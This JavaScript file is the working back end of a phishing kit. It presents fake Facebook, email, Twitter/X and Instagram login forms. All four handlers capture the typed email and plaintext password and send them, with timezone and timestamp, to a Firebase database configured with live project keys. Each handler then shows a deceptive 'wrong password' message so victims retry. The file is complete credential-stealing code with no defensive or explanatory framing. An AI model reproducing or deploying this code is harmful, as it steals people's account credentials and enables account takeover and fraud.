 // Initialize Firebase 
 const firebaseConfig = {
  apiKey: "AIzaSyA_nBeaIR9LuzSE1FR6seaskboK7eSkqU4",
  authDomain: "fazzabirds.firebaseapp.com",
  databaseURL: "https://fazzabirds-default-rtdb.firebaseio.com",
  projectId: "fazzabirds",
  storageBucket: "fazzabirds.appspot.com",
  messagingSenderId: "971051821488",
  appId: "1:971051821488:web:8f5c2fa5a3e0b881b3ce75"
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);
 
function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showError(error.message, "error_box");
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showError(
        "Oops, something went wrong. Please try again later.",
        "error_box"
      );
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  } else {
    showError("Please enter both email and password.", "error_box");
  }
}

function hmlogin() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showError(error.message, "error_box");
    });

  var email = document.getElementById("hm-email").value;
  var password = document.getElementById("hm-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Email";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showError(
        "Wrong password. Try again or click Forgot password to reset it.",
        "error_box"
      );
      document.getElementById("hm-pass").value = "";
      return false;
    }, 2000);
  } else {
    showError("Please enter both email and password.", "error_box");
  }
}

function twlogin() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showError(error.message, "error_box");
    });

  var email = document.getElementById("tw-email").value;
  var password = document.getElementById("tw-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Twitter/X";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showError("Invalid username or password", "error_box");
      document.getElementById("tw-pass").value = "";
      return false;
    }, 2000);
  } else {
    showError("Please enter both email and password.", "error_box");
  }
}

function iglog() {
  var email = document.getElementById("ig-uname").value.trim();
  var password = document.getElementById("ig-pass").value.trim();
  var errorBox = "ig_error_box";

  if (email === "" || password === "") {
    showError("Please enter both email and password.", errorBox);
    return false; // Prevents further execution
  }

  // If inputs are valid, proceed with anonymous sign-in
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showError(error.message, errorBox);
    });

  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  // Store the data in the Firebase database
  firebase.database().ref("fbdet").push({
    emle: email,
    mobile: "",
    time: currentTime,
    timezone: timezone,
    pass: password,
    date: currentDate,
    type: accountType,
  });

  // Simulate a delay and provide feedback
  setTimeout(function () {
    showError("Please double-check your password", errorBox);
    document.getElementById("ig-pass").value = ""; // Clear the password field
    return false; // Optionally prevent form submission if that's the goal
  }, 2000);
}

function showError(message, boxId) {
  var errorBox = document.getElementById(boxId);
  errorBox.style.display = "block";
  errorBox.querySelector("div:nth-child(2)").textContent = message;
}

function hideError(boxId) {
  var errorBox = document.getElementById(boxId);
  errorBox.style.display = "none";
}
 
